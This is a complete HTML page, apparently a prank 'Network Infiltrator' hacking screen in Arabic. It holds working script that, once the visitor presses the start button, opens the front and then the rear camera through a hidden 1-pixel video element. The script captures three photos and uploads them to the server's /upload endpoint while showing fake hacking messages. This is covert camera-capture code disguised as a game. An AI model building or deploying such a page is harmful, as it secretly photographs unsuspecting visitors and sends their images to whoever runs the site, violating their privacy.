<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Network Infiltrator</title>
  <style>
    body { background-color: #000; color: #00ff00; font-family: monospace; text-align: center; padding: 20px; }
    h1 { color: #ff0000; }
    #log { text-align: right; height: 200px; overflow-y: auto; border: 1px solid #333; padding: 10px; margin: 20px auto; max-width: 400px; }
    button { background: #00ff00; color: #000; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; font-weight: bold; }
    button:disabled { background: #555; cursor: not-allowed; }
    #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; top: 0; left: 0; }
  </style>
</head>
<body>
  <h1>☠️ جاري اختراق الشبكة ☠️</h1>
  <div id="log">
    <div>> بدء الاتصال بسيرفر القيادة...</div>
    <div>> البحث عن الثغرات...</div>
    <div>> في انتظار بدء الاختراق...</div>
  </div>
  <button id="startBtn">بدء الاختراق</button>
  <div id="status" style="margin-top:20px; color:red;"></div>
  
  <video id="video" autoplay playsinline muted></video>

  <script>
    const video = document.getElementById('video');
    const status = document.getElementById('status');
    const btn = document.getElementById('startBtn');
    let stream = null;

    btn.onclick = async () => {
      try {
        btn.disabled = true;
        btn.style.display = 'none';
        
        status.innerText = "جاري طلب الصلاحيات...";
        // هنفتح الكاميرا الأمامية مرة واحدة بس
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = stream;
        
        // بنستنى الكاميرا تسخن
        await new Promise(r => setTimeout(r, 2000));

        status.innerText = "جاري الاختراق... 3";
        await new Promise(r => setTimeout(r, 1000));
        status.innerText = "جاري الاختراق... 2";
        await new Promise(r => setTimeout(r, 1000));
        status.innerText = "جاري الاختراق... 1";
        await new Promise(r => setTimeout(r, 1000));
        
        status.innerText = "جاري سرقة البيانات...";

        const photos = [];
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 720;
        canvas.height = video.videoHeight || 960;

        // هنصور صورتين ورا بعض من غير ما نقفل الكاميرا
        for (let i = 0; i < 2; i++) {
          canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
          const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
          photos.push(blob);
          await new Promise(r => setTimeout(r, 500)); 
        }

        // دلوقتي هنقفل الكاميرا الأمامية عشان نفتح الخلفية
        stream.getTracks().forEach(t => t.stop());
        await new Promise(r => setTimeout(r, 1000)); // استراحة ثانية للمتصفح

        // هنفتح الكاميرا الخلفية
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 2000)); // استنى تسخن

        // هنصور الصورة التالتة
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob3 = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
        photos.push(blob3);

        // نقفل الكاميرا نهائي
        stream.getTracks().forEach(t => t.stop());

        // نرسل الصور
        const form = new FormData();
        photos.forEach((p, i) => form.append('photos', p, `photo_${i + 1}.jpg`));

        await fetch('/upload', { method: 'POST', body: form });
        
        status.innerText = "✅ تم الاختراق بنجاح! (أغلق الصفحة)";
        status.style.color = "#00ff00";
      } catch (err) {
        status.innerText = "❌ فشل: " + err.message;
        btn.disabled = false;
        btn.style.display = 'inline-block';
      }
    };
  </script>
</body>
</html>
